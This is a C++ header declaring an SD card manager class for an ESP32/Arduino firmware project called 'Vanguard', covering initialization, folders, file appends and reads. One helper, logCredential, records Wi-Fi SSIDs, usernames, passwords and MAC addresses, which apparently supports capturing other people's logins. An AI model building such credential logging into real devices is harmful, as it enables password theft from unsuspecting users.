#ifndef VANGUARD_SD_MANAGER_H
#define VANGUARD_SD_MANAGER_H

/**
 * @file SDManager.h
 * @brief Handles SD card initialization and file operations
 */

#include <Arduino.h>
#include <SD.h>
#include <FS.h>
#include <freertos/semphr.h>

namespace Vanguard {

class SDManager {
public:
    static SDManager& getInstance();

    bool init();
    bool isAvailable() const;

    // Folder management
    bool ensureDirectory(const char* path);
    void createFolderStructure();

    // File operations
    bool appendToFile(const char* path, const char* data);
    String readFile(const char* path, size_t maxBytes = 65536);
    bool fileExists(const char* path);

    // Logging helpers
    bool logCredential(const char* ssid, const char* user, const char* pass, const char* mac);

private:
    SDManager();
    bool m_initialized;
    SemaphoreHandle_t m_fileMutex;
};

} // namespace Vanguard

#endif // VANGUARD_SD_MANAGER_H
